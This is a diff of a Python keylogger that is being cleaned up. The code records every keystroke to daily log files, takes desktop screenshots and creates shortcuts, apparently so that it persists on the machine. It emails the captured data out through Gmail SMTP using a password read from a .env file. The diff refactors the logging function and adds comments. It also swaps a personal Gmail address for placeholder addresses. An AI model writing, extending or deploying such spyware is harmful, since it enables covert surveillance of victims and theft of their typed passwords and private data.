@@ -53,9 +53,10 @@ def win_replicate():
     shortcut.WorkingDirectory = script_dir # Set the working directory to the script's directory
     shortcut.save()
 
+# User has pressed a key
 def on_press(key):
     keys.append(key)
-    write_file(keys)
+    write_to_log(keys)
 
     try:
         print('alphanumeric key {0} pressed'.format(
@@ -64,6 +65,7 @@ def on_press(key):
         print('special key {0} pressed'.format(
             key))
 
+# User has released a key
 def on_release(key):
     print('{0} released'.format(
         key))
@@ -71,19 +73,18 @@ def on_release(key):
         # Stop listener
         return False
     
-def write_file(keys):
-    path = win_create_folder() 
+# Write to the daily log file
+def write_to_log(keys):
+    path = win_create_folder()
+    curr_date = date.today()
+    date_str = curr_date.strftime("%d-%m-%Y")
 
     with open(f'{path}/logs/{date_str}.log', 'w') as f:
         for key in keys:
-            # removing ''
             k = str(key).replace("'", "")
-            f.write(k)
-                     
-            # explicitly adding a space after
-            # every keystroke for readability
-            f.write(' ')
+            f.write(f'{k} ')
 
+# Take a screenshot of the desktop and save to file
 def screenshot():
     path = win_create_folder()
     
@@ -125,8 +126,8 @@ while True:
         print("Sending email...")
         port = 465
         password = open("../.env").readlines()[0]
-        sender_email = "codyschaefer22@gmail.com"
-        recvr_email = "codyschaefer22@gmail.com"
+        sender_email = "senderexample@gmail.com"
+        recvr_email = "receiverexample@gmail.com"
         subject = f'{date_str}_{curr_time.strftime("%H-%M-%S")} Update'
         body = ""
 
@@ -175,7 +176,7 @@ while True:
         context = ssl.create_default_context()
 
         with smtplib.SMTP_SSL("smtp.gmail.com", port, context=context) as server:
-            server.login("codyschaefer22@gmail.com", password)
+            server.login(sender_email, password)
             server.sendmail(sender_email, recvr_email, text)
 
         # Reset email time
